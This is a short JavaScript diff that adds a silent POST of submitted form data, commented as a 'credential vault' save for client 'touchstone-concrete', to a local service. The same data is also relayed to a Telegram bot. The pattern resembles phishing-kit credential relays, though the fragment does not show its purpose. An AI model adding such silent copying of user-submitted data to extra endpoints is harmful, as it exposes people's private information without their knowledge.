@@ -553,6 +553,14 @@
             if (data.notes) msg += 'Notes: ' + data.notes + '\n';
 
             try {
+                // 1. Save to credential vault (primary)
+                await fetch('http://localhost:9876/vault/save', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ ...data, client: 'touchstone-concrete' })
+                }).catch(() => {});
+
+                // 2. Telegram notification (secondary)
                 var resp = await fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
